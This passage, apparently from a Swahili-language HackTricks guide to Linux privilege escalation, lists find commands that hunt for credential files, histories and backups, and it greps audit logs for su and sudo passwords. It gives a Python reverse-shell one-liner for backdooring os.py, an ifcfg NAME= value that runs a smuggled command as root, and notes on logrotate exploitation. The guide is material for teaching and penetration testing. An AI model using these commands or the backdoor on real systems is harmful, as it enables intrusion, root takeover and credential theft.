find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Faili za Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml mafaili
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Faili zilizofichwa
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries katika PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Faili za wavuti**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Nakala za akiba**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Mafaili yaliyofahamika yanayohifadhi passwords

Soma msimbo wa [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), hutafuta **faili kadhaa zinazoweza kuwa na passwords**.\  
**Chombo kingine cha kuvutia** unachoweza kutumia ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) ambayo ni programu ya chanzo wazi inayotumika kupata passwords nyingi zilizohifadhiwa kwenye kompyuta ya ndani kwa Windows, Linux & Mac.

### Logs

Ikiwa unaweza kusoma logs, unaweza kupata **taarifa za kuvutia/za siri ndani yao**. Kama log ni ya kushangaza zaidi, ndivyo itakavyokuwa ya kuvutia zaidi (labda).\  
Pia, baadhi ya "**mbaya**" zilizosetiwa (backdoored?) **audit logs** zinaweza kukuwezesha **kurekodi passwords** ndani ya audit logs kama ilivyoelezwa katika chapisho hiki: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Ili kusoma logs, kikundi [**adm**](interesting-groups-linux-pe/index.html#adm-group) kitasaidia sana.

### Faili za shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Utafutaji wa Creds za Kawaida/Regex

Unapaswa pia kuangalia faili zinazojumuisha neno "**password**" katika **jina** lake au ndani ya **yaliyomo**, na pia kuangalia IPs na emails ndani ya logs, au hashes regexps.\
Sitaorodhesha hapa jinsi ya kufanya yote haya lakini ukipendezwa unaweza kuangalia ukaguzi wa mwisho ambao [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) hufanya.

## Faili zinazoweza kuandikwa

### Python library hijacking

Ikiwa unajua **kutoka wapi** script ya python itaendeshwa na unaweza **kuandika ndani** ya folda hiyo au unaweza **kuhariri python libraries**, unaweza kubadilisha OS library na kuiweka backdoor (ikiwa unaweza kuandika mahali script ya python itaendeshwa, nakili na bandika os.py library).

Ili **backdoor the library** ongeza tu mwishoni mwa os.py library mstari ufuatao (badilisha IP na PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Udhaifu katika `logrotate` unawawezesha watumiaji wenye **idhini ya kuandika** kwenye faili ya logi au kwenye saraka zake za juu kupata uwezo wa kuongezewa ruhusa. Hii ni kwa sababu `logrotate`, mara nyingi ikiendeshwa kama **root**, inaweza kudhibitiwa ili kuendesha faili yoyote ile, hasa kwenye saraka kama _**/etc/bash_completion.d/**_. Ni muhimu kukagua ruhusa si tu katika _/var/log_ bali pia katika saraka yoyote ambapo log rotation inafanyika.

> [!TIP]
> Udhaifu huu unahusu toleo la `logrotate` `3.18.0` na ndogo zaidi

Maelezo ya kina kuhusu udhaifu yanaweza kupatikana kwenye ukurasa huu: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Unaweza kutumia udhaifu huu kwa kutumia [**logrotten**](https://github.com/whotwagner/logrotten).

UdHAIFU huu ni sawa sana na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** kwa hivyo kila unapogundua kwamba unaweza kubadilisha logs, angalia nani anayesimamia logs hizo na uangalie kama unaweza kupata kuongezwa kwa ruhusa kwa kubadilisha logs kuwa symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ikiwa, kwa sababu yoyote, mtumiaji anaweza **kuandika** script ya `ifcf-<whatever>` hadi _/etc/sysconfig/network-scripts_ **au** anaweza **kubadilisha** iliyopo, basi mfumo wako umepwned.

Network scripts, _ifcg-eth0_ kwa mfano hutumika kwa muunganisho wa mtandao. Zinajionyesha kabisa kama faili za .INI. Hata hivyo, zinakuwa \~sourced\~ kwenye Linux na Network Manager (dispatcher.d).

Katika kesi yangu, thamani ya `NAME=` katika network scripts hizi haisindikwi vizuri. Ikiwa una **nafasi nyeupe/blank katika jina mfumo unajaribu kutekeleza sehemu baada ya nafasi nyeupe/blank**. Hii ina maana kwamba **kila kitu kinachofuata baada ya nafasi ya kwanza kinatekelezwa kama root**.

Kwa mfano: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Kumbuka nafasi tupu kati ya Network na /bin/id_)

### **init, init.d, systemd, and rc.d**

The directory `/etc/init.d` is home to **scripts** for System V init (SysVinit), the **classic Linux service management system**. It includes scripts to `start`, `stop`, `restart`, and sometimes `reload` services. These can be executed directly or through symbolic links found in `/etc/rc?.d/`. An alternative path in Redhat systems is `/etc/rc.d/init.d`.

Kwa upande mwingine, `/etc/init` inaambatanishwa na **Upstart**, mfumo mpya wa **service management** ulioanzishwa na Ubuntu, ukitumia mafaili ya configuration kwa kazi za usimamizi wa huduma. Licha ya mabadiliko kwenda Upstart, SysVinit scripts bado zinatumika pamoja na configuration za Upstart kutokana na safu ya ulinganifu ndani ya Upstart.

**systemd** inatokea kama msimamizi wa kisasa wa initialization na huduma, ikitoa vipengele vya juu kama kuanzisha daemon kwa mahitaji (on-demand), usimamizi wa automount, na snapshots za hali ya mfumo. Inapanga mafaili ndani ya `/usr/lib/systemd/` kwa packages za distribution na `/etc/systemd/system/` kwa mabadiliko ya msimamizi, ikirahisisha mchakato wa usimamizi wa mfumo.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks commonly hook a syscall to expose privileged kernel functionality to a userspace manager. Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) can enable a local app to impersonate the manager and escalate to root on already-rooted devices. Learn more and exploitation details here:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)


{{#include ../../banners/hacktricks-training.md}}
